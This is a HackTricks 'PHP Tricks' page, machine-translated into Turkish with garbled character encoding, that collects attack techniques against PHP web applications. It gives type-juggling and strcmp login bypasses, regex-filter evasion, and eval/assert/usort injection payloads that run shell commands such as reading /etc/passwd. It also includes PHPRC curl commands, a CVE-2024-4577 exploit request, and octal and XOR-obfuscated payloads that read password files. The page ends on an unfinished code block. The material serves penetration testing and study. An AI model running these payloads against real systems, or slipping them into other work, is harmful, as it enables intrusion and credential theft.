# PHP Tricks

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Ã‡erezlerin yaygÄ±n konumu:

Bu, phpMyAdmin Ã§erezleri iÃ§in de geÃ§erlidir.

Ã‡erezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP karÅŸÄ±laÅŸtÄ±rmalarÄ±nÄ± atlatma

### GevÅŸek karÅŸÄ±laÅŸtÄ±rmalar/Tip DeÄŸiÅŸtirme ( == )

EÄŸer `==` PHP'de kullanÄ±lÄ±yorsa, beklenmedik durumlar ortaya Ã§Ä±kar ve karÅŸÄ±laÅŸtÄ±rma beklenildiÄŸi gibi davranmaz. Bunun nedeni, "==" sadece aynÄ± tipe dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lmÃ¼ÅŸ deÄŸerleri karÅŸÄ±laÅŸtÄ±rmasÄ±dÄ±r; karÅŸÄ±laÅŸtÄ±rÄ±lan verilerin tipinin de aynÄ± olmasÄ±nÄ± istiyorsanÄ±z `===` kullanmalÄ±sÄ±nÄ±z.

PHP karÅŸÄ±laÅŸtÄ±rma tablolarÄ±: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` SayÄ± ile baÅŸlamayan bir dize, bir sayÄ±ya eÅŸittir
* `"0xAAAA" == "43690" -> True` OnaltÄ±lÄ±k veya ondalÄ±k formatta sayÄ±lardan oluÅŸan dizeler, sayÄ±lar aynÄ±ysa diÄŸer sayÄ±lar/dizeler ile True sonucu verecek ÅŸekilde karÅŸÄ±laÅŸtÄ±rÄ±labilir (bir dizideki sayÄ±lar sayÄ± olarak yorumlanÄ±r)
* `"0e3264578" == 0 --> True` "0e" ile baÅŸlayan ve ardÄ±ndan herhangi bir ÅŸey gelen bir dize, 0'a eÅŸit olacaktÄ±r
* `"0X3264578" == 0X --> True` "0" ile baÅŸlayan ve ardÄ±ndan herhangi bir harf (X herhangi bir harf olabilir) ve ardÄ±ndan herhangi bir ÅŸey gelen bir dize, 0'a eÅŸit olacaktÄ±r
* `"0e12334" == "0" --> True` Bu Ã§ok ilginÃ§tir Ã§Ã¼nkÃ¼ bazÄ± durumlarda "0" dizesinin girdiÄŸini ve bununla karÅŸÄ±laÅŸtÄ±rÄ±lan bir iÃ§eriÄŸi kontrol edebilirsiniz. Bu nedenle, "0e" ile baÅŸlayan ve herhangi bir harf iÃ§ermeyen bir hash oluÅŸturacak bir deÄŸer saÄŸlayabilirseniz, karÅŸÄ±laÅŸtÄ±rmayÄ± atlatabilirsiniz. Bu formatta **zaten hashlenmiÅŸ dizeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir dizideki herhangi bir harf, int 0'a eÅŸittir

Daha fazla bilgi iÃ§in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip DeÄŸiÅŸtirme** varsayÄ±lan olarak `in_array()` fonksiyonunu da etkiler (katÄ± bir karÅŸÄ±laÅŸtÄ±rma yapmak iÃ§in Ã¼Ã§Ã¼ncÃ¼ argÃ¼manÄ± true olarak ayarlamanÄ±z gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

EÄŸer bu fonksiyon **herhangi bir kimlik doÄŸrulama kontrolÃ¼** iÃ§in kullanÄ±lÄ±yorsa (ÅŸifre kontrolÃ¼ gibi) ve kullanÄ±cÄ± karÅŸÄ±laÅŸtÄ±rmanÄ±n bir tarafÄ±nÄ± kontrol ediyorsa, ÅŸifre deÄŸeri olarak bir dizi yerine boÅŸ bir dizi gÃ¶nderebilir (`https://example.com/login.php/?username=admin&password[]=`) ve bu kontrolÃ¼ atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` ile aynÄ± hata meydana gelir

### KatÄ± TÃ¼r DÃ¶nÃ¼ÅŸÃ¼mÃ¼

`===` **kullanÄ±lÄ±yor olsa bile**, **karÅŸÄ±laÅŸtÄ±rmayÄ±** **tip dÃ¶nÃ¼ÅŸÃ¼mÃ¼ne** **duyarlÄ±** hale getiren hatalar olabilir. Ã–rneÄŸin, eÄŸer karÅŸÄ±laÅŸtÄ±rma **karÅŸÄ±laÅŸtÄ±rmadan Ã¶nce veriyi farklÄ± bir tÃ¼r nesneye dÃ¶nÃ¼ÅŸtÃ¼rÃ¼yorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanÄ±cÄ± giriÅŸi **doÄŸrulamak** iÃ§in kullanÄ±labilir (kullanÄ±cÄ± giriÅŸi Ã¼zerinde herhangi bir **kelime/regex** **kara liste**'den **varsa** kontrol eder ve eÄŸer yoksa, kod Ã§alÄ±ÅŸmaya devam edebilir).

#### Yeni satÄ±r atlatma

Ancak, regexp'nin baÅŸlangÄ±cÄ±nÄ± belirlerken `preg_match()` **kullanÄ±cÄ± giriÅŸinin sadece ilk satÄ±rÄ±nÄ± kontrol eder**, bu nedenle eÄŸer bir ÅŸekilde giriÅŸi **birden fazla satÄ±rda** **gÃ¶nderebilirseniz**, bu kontrolÃ¼ atlatabilirsiniz. Ã–rnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolÃ¼ atlamak iÃ§in **deÄŸerleri yeni satÄ±rlarla urlencoded olarak gÃ¶nderebilirsiniz** (`%0A`) veya **JSON verisi** gÃ¶nderebiliyorsanÄ±z, bunu **birkaÃ§ satÄ±rda** gÃ¶nderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatasÄ± atlatma**

(Bu atlatma, gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re PHP 5.2.5 Ã¼zerinde denendi ve PHP 7.3.15 Ã¼zerinde Ã§alÄ±ÅŸtÄ±ramadÄ±m)\
EÄŸer `preg_match()`'e geÃ§erli Ã§ok **bÃ¼yÃ¼k bir girdi** gÃ¶nderebilirseniz, **iÅŸleyemeyecek** ve kontrolÃ¼ **atlatabileceksiniz**. Ã–rneÄŸin, bir JSON'u kara listeye alÄ±yorsa ÅŸunu gÃ¶nderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

KÄ±sacasÄ±, sorun PHP'deki `preg_*` fonksiyonlarÄ±nÄ±n [PCRE kÃ¼tÃ¼phanesi](http://www.pcre.org/) Ã¼zerine inÅŸa edilmesinden kaynaklanÄ±yor. PCRE'de belirli dÃ¼zenli ifadeler, Ã§ok sayÄ±da Ã¶zyinelemeli Ã§aÄŸrÄ± kullanÄ±larak eÅŸleÅŸtirilir, bu da Ã§ok fazla yÄ±ÄŸÄ±n alanÄ± kullanÄ±r. Ä°zin verilen Ã¶zyineleme sayÄ±sÄ± iÃ§in bir sÄ±nÄ±r belirlemek mÃ¼mkÃ¼ndÃ¼r, ancak PHP'de bu sÄ±nÄ±r [varsayÄ±lan olarak 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) olup, bu yÄ±ÄŸÄ±nda sÄ±ÄŸacak olandan fazladÄ±r.

[Bu Stackoverflow baÅŸlÄ±ÄŸÄ±](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da bu konunun daha derinlemesine tartÄ±ÅŸÄ±ldÄ±ÄŸÄ± gÃ¶nderide baÄŸlantÄ±lÄ±ydÄ±. GÃ¶revimiz ÅŸimdi aÃ§Ä±ktÄ±:\
**Regex'in 100\_000+ Ã¶zyineleme yapmasÄ±nÄ± saÄŸlayacak bir girdi gÃ¶nderin, bu da SIGSEGV'ye neden olacak, `preg_match()` fonksiyonunun `false` dÃ¶ndÃ¼rmesine neden olacak ve bÃ¶ylece uygulamanÄ±n girdimizin kÃ¶tÃ¼ niyetli olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmesini saÄŸlayacak, yÃ¼kÃ¼n sonunda `{system(<verybadcommand>)}` gibi bir sÃ¼rpriz atarak SSTI --> RCE --> flag :)**.

AslÄ±nda regex terimleriyle, 100k "Ã¶zyineleme" yapmÄ±yoruz, bunun yerine "geri izleme adÄ±mlarÄ±nÄ±" sayÄ±yoruz, bu da [PHP belgelerinde](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) belirtildiÄŸi gibi `pcre.backtrack_limit` deÄŸiÅŸkeninde varsayÄ±lan olarak 1\_000\_000 (1M) olarak ayarlanmÄ±ÅŸtÄ±r.\
Buna ulaÅŸmak iÃ§in, `'X'*500_001` 1 milyon geri izleme adÄ±mÄ±na (500k ileri ve 500k geri) neden olacaktÄ±r:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation iÃ§in Tip DolaÅŸÄ±mÄ±
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

EÄŸer PHP baÅŸka bir sayfaya yÃ¶nlendiriyorsa ancak baÅŸlÄ±k `Location` ayarlandÄ±ktan sonra **`die`** veya **`exit`** fonksiyonu **Ã§aÄŸrÄ±lmadÄ±ysa**, PHP Ã§alÄ±ÅŸmaya devam eder ve verileri gÃ¶vdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal ve Dosya Dahil Etme Ä°stismarÄ±

Kontrol et:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Daha Fazla Hile

* **register\_globals**: **PHP < 4.1.1.1**'de veya yanlÄ±ÅŸ yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda, **register\_globals** aktif olabilir (veya davranÄ±ÅŸlarÄ± taklit ediliyor olabilir). Bu, $\_GET gibi global deÄŸiÅŸkenlerde bir deÄŸer varsa Ã¶rneÄŸin $\_GET\["param"]="1234", **$param Ã¼zerinden eriÅŸebileceÄŸiniz anlamÄ±na gelir. Bu nedenle, HTTP parametreleri gÃ¶ndererek, kod iÃ§inde kullanÄ±lan deÄŸiÅŸkenleri** geÃ§ersiz kÄ±labilirsiniz.
* **AynÄ± alanÄ±n PHPSESSION Ã§erezleri aynÄ± yerde saklanÄ±r**, bu nedenle bir alanda **farklÄ± Ã§erezler farklÄ± yollarla kullanÄ±lÄ±yorsa**, bir yolun **diÄŸer yolun Ã§erezine eriÅŸmesini** saÄŸlayabilirsiniz ve diÄŸer yol Ã§erezinin deÄŸerini ayarlayabilirsiniz.\
Bu ÅŸekilde, eÄŸer **her iki yol da aynÄ± isimde bir deÄŸiÅŸkene eriÅŸiyorsa**, **o deÄŸiÅŸkenin path1'deki deÄŸeri path2'ye uygulanabilir**. Ve ardÄ±ndan path2, path1'in deÄŸiÅŸkenlerini geÃ§erli kabul edecektir (Ã§ereze path2'deki karÅŸÄ±lÄ±k gelen ismi vererek).
* Makinenin kullanÄ±cÄ±larÄ±nÄ±n **kullanÄ±cÄ± adlarÄ±nÄ±** aldÄ±ÄŸÄ±nÄ±zda, php dizinlerinin etkin olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in adresi kontrol edin: **/\~\<USERNAME>**.
* [**LFI ve RCE php sarmalayÄ±cÄ±larÄ± kullanarak**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **ÅŸifrelerden hash oluÅŸturmak** ve bir ÅŸifrenin bir hash ile karÅŸÄ±laÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda **doÄŸru olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek** iÃ§in kullanÄ±lÄ±r.\
Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` ( `$2y$` ile baÅŸlar). **PASSWORD\_DEFAULT genellikle PASSWORD\_BCRYPT ile aynÄ±dÄ±r.** Ve ÅŸu anda, **PASSWORD\_BCRYPT**'in **giriÅŸte 72 baytlÄ±k bir boyut sÄ±nÄ±rlamasÄ±** vardÄ±r. Bu nedenle, bu algoritma ile 72 bayttan daha bÃ¼yÃ¼k bir ÅŸeyi hashlemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda yalnÄ±zca ilk 72B kullanÄ±lacaktÄ±r:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP baÅŸlÄ±klarÄ± bypass ederek PHP hatalarÄ±nÄ± istismar etme

#### BaÅŸlÄ±klarÄ± ayarladÄ±ktan sonra hata oluÅŸturma

[**bu twitter dizisinden**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) gÃ¶rebilirsiniz ki, 1000'den fazla GET parametresi veya 1000'den fazla POST parametresi veya 20 dosya gÃ¶nderildiÄŸinde, PHP yanÄ±tÄ±nda baÅŸlÄ±klarÄ± ayarlamayacaktÄ±r.

Bu, Ã¶rneÄŸin CSP baÅŸlÄ±klarÄ±nÄ±n kodlarda ayarlanmasÄ±nÄ± atlamaya izin verir:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### BaÅŸlÄ±klarÄ± ayarlamadan Ã¶nce bir gÃ¶vde doldurma

EÄŸer bir **PHP sayfasÄ± hatalarÄ± yazdÄ±rÄ±yorsa ve kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan bazÄ± girdileri geri ekrana basÄ±yorsa**, kullanÄ±cÄ± PHP sunucusunun geri yazdÄ±rmasÄ±nÄ± saÄŸlayabilir. **Yeterince uzun bir iÃ§erik** ekleyerek, sunucu yanÄ±tÄ±na **baÅŸlÄ±klarÄ± eklemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda** bir hata verecektir.\
AÅŸaÄŸÄ±daki senaryoda **saldÄ±rgan sunucunun bÃ¼yÃ¼k hatalar vermesini saÄŸladÄ±** ve ekranda gÃ¶rebileceÄŸiniz gibi PHP baÅŸlÄ±k bilgilerini **deÄŸiÅŸtirmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, baÅŸaramadÄ±** (Ã¶rneÄŸin, CSP baÅŸlÄ±ÄŸÄ± kullanÄ±cÄ±ya gÃ¶nderilmedi):

![](<../../../.gitbook/assets/image (1085).png>)

## PHP fonksiyonlarÄ±nda SSRF

SayfayÄ± kontrol et:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Kod yÃ¼rÃ¼tme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla yararlÄ± PHP fonksiyonu iÃ§in bunu kontrol edin](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **preg\_replace()** ile **RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argÃ¼manÄ±nda kodu Ã§alÄ±ÅŸtÄ±rmak iÃ§in en az bir eÅŸleÅŸme gereklidir.\
Bu preg\_replace seÃ§eneÄŸi **PHP 5.5.0 itibarÄ±yla kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸtÄ±r.**

### **Eval() ile RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Php iÃ§indeki bu fonksiyon, **bir dizede yazÄ±lmÄ±ÅŸ kodu Ã§alÄ±ÅŸtÄ±rmanÄ±za** olanak tanÄ±r ve **true veya false dÃ¶ndÃ¼rÃ¼r** (ve buna baÄŸlÄ± olarak yÃ¼rÃ¼tmeyi deÄŸiÅŸtirir). Genellikle kullanÄ±cÄ± deÄŸiÅŸkeni bir dize iÃ§inde ortada yer alÄ±r. Ã–rneÄŸin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek iÃ§in ÅŸunlarÄ± yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Kod **sÃ¶zdizimini** **bozmanÄ±z**, **payload**'Ä±nÄ±zÄ± **eklemeniz** ve sonra **tekrar dÃ¼zeltmeniz** gerekecek. **"and" veya "%26%26" veya "|"** gibi **mantÄ±ksal iÅŸlemler** kullanabilirsiniz. "or", "||" Ã§alÄ±ÅŸmaz Ã§Ã¼nkÃ¼ ilk koÅŸul doÄŸruysa payload'Ä±mÄ±z Ã§alÄ±ÅŸmayacaktÄ±r. AynÄ± ÅŸekilde ";" Ã§alÄ±ÅŸmaz Ã§Ã¼nkÃ¼ payload'Ä±mÄ±z Ã§alÄ±ÅŸmayacaktÄ±r.

**DiÄŸer bir seÃ§enek**, dizeye komutun yÃ¼rÃ¼tÃ¼lmesini eklemektir: `'.highlight_file('.passwd').'`

**DiÄŸer bir seÃ§enek** (eÄŸer iÃ§ kodunuz varsa) bazÄ± deÄŸiÅŸkenleri deÄŸiÅŸtirerek yÃ¼rÃ¼tmeyi deÄŸiÅŸtirmektir: `$file = "hola"`

### **RCE via usort()**

Bu fonksiyon, belirli bir fonksiyonu kullanarak bir dizi Ã¶ÄŸeyi sÄ±ralamak iÃ§in kullanÄ±lÄ±r.\
Bu fonksiyonu kÃ¶tÃ¼ye kullanmak iÃ§in:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
You can also use **//** to comment the rest of the code.

To discover the number of parenthesis that you need to close:

* `?order=id;}//`: bir hata mesajÄ± alÄ±yoruz (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
* `?order=id);}//`: bir **uyarÄ±** alÄ±yoruz. Bu doÄŸru gÃ¶rÃ¼nÃ¼yor.
* `?order=id));}//`: bir hata mesajÄ± alÄ±yoruz (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanÄ±ÅŸ parantezimiz var.

### **RCE via .httaccess**

If you can **upload** a **.htaccess**, then you can **configure** several things and even execute code (configuring that files with extension .htaccess can be **executed**).

Different .htaccess shells can be found [here](https://github.com/wireghoul/htshells)

### RCE via Env Variables

If you find a vulnerability that allows you to **modify env variables in PHP** (and another one to upload files, although with more research maybe this can be bypassed), you could abuse this behaviour to get **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu env deÄŸiÅŸkeni, diÄŸer ikili dosyalarÄ± Ã§alÄ±ÅŸtÄ±rÄ±rken rastgele kÃ¼tÃ¼phaneleri yÃ¼klemenizi saÄŸlar (bu durumda Ã§alÄ±ÅŸmayabilir).
* **`PHPRC`** : PHP'ye **konfigÃ¼rasyon dosyasÄ±nÄ± nerede bulacaÄŸÄ±nÄ±** belirtir, genellikle `php.ini` olarak adlandÄ±rÄ±lÄ±r. Kendi konfigÃ¼rasyon dosyanÄ±zÄ± yÃ¼kleyebilirseniz, o zaman `PHPRC`'yi PHP'yi ona yÃ¶nlendirmek iÃ§in kullanÄ±n. Ä°kinci yÃ¼klenen dosyayÄ± belirten bir **`auto_prepend_file`** giriÅŸi ekleyin. Bu ikinci dosya, PHP Ã§alÄ±ÅŸma zamanÄ± tarafÄ±ndan diÄŸer kodlardan Ã¶nce Ã§alÄ±ÅŸtÄ±rÄ±lan normal **PHP kodunu** iÃ§erir.
1. Shell kodumuzu iÃ§eren bir PHP dosyasÄ± yÃ¼kleyin
2. AdÄ±m 1'de yÃ¼klediÄŸimiz dosyayÄ± Ã§alÄ±ÅŸtÄ±rmasÄ± iÃ§in PHP Ã¶n iÅŸleyicisine talimat veren bir **`auto_prepend_file`** direktifi iÃ§eren ikinci bir dosya yÃ¼kleyin
3. `PHPRC` deÄŸiÅŸkenini adÄ±m 2'de yÃ¼klediÄŸimiz dosyaya ayarlayÄ±n.
* Bu zinciri nasÄ±l Ã§alÄ±ÅŸtÄ±racaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi alÄ±n [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - baÅŸka bir seÃ§enek
* EÄŸer **dosya yÃ¼kleyemezseniz**, FreeBSD'de **`stdin`**'i iÃ§eren "file" `/dev/fd/0` kullanabilirsiniz:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ya da RCE almak iÃ§in **`allow_url_include`**'yi etkinleÅŸtirip **base64 PHP kodu** ile bir dosya ekleyin:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Web sunucusu HTTP isteklerini ayrÄ±ÅŸtÄ±rÄ±r ve bunlarÄ± `php.exe cgi.php foo=bar` gibi bir isteÄŸi Ã§alÄ±ÅŸtÄ±ran bir PHP betiÄŸine iletir, bu da bir parametre enjeksiyonuna izin verir. Bu, gÃ¶vde iÃ§inden PHP kodunu yÃ¼klemek iÃ§in aÅŸaÄŸÄ±daki parametreleri enjekte etmeyi saÄŸlar:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
AyrÄ±ca, PHP'nin sonraki normalizasyonu nedeniyle "-" parametresini 0xAD karakteri kullanarak enjekte etmek mÃ¼mkÃ¼ndÃ¼r. [**bu gÃ¶nderiden**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/) Ã¶rneÄŸi kontrol edin.
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitizasyon atlatma & Brain Fuck

[**Bu yazÄ±da**](https://blog.redteam-pentesting.de/2024/moodle-rce/) Ã§ok az karakterin izin verildiÄŸi bir brain fuck PHP kodu oluÅŸturmak iÃ§in harika fikirler bulmak mÃ¼mkÃ¼ndÃ¼r.\
AyrÄ±ca, birkaÃ§ kontrolÃ¼ atlatmalarÄ±nÄ± saÄŸlayan fonksiyonlarÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±n ilginÃ§ bir yolu da Ã¶nerilmektedir:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Statik analizi

Bu fonksiyonlara yapÄ±lan Ã§aÄŸrÄ±larda kod ekleyip ekleyemeyeceÄŸinizi kontrol edin (buradan): [here](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
EÄŸer bir PHP uygulamasÄ±nÄ± hata ayÄ±klÄ±yorsanÄ±z, `display_errors = On` ekleyerek `/etc/php5/apache2/php.ini` dosyasÄ±nda hata yazdÄ±rmayÄ± global olarak etkinleÅŸtirebilir ve apache'yi yeniden baÅŸlatabilirsiniz: `sudo systemctl restart apache2`

### PHP kodunu deÅŸifre etme

PHP kodunu deÅŸifre etmek iÃ§in **web**[ **www.unphp.net**](http://www.unphp.net) **kullanabilirsiniz.**

## PHP SarÄ±cÄ±larÄ± ve Protokoller

PHP SarÄ±cÄ±larÄ± ve protokolleri, bir sistemde **yazma ve okuma korumalarÄ±nÄ± atlamanÄ±za** ve onu tehlikeye atmanÄ±za olanak tanÄ±yabilir. [**daha fazla bilgi iÃ§in bu sayfayÄ± kontrol edin**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ RCE

EÄŸer `phpconfig()` Ã§Ä±ktÄ±sÄ±nda **Xdebug**'Ä±n **etkin** olduÄŸunu gÃ¶rÃ¼yorsanÄ±z, [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) Ã¼zerinden RCE elde etmeyi denemelisiniz.

## DeÄŸiÅŸken deÄŸiÅŸkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE yeni $\_GET\["a"]\($\_GET\["b")'yi istismar etme

Bir sayfada **rastgele bir sÄ±nÄ±fÄ±n yeni bir nesnesini oluÅŸturabiliyorsanÄ±z** RCE elde etme ÅŸansÄ±nÄ±z olabilir, nasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harf olmadan PHP Ã§alÄ±ÅŸtÄ±rma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizli kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XOR kolay shell kodu

[**bu yazÄ±ya** ](https://mgp25.com/ctf/Web-challenge/)gÃ¶re, kolay bir shell kodu bu ÅŸekilde oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```php
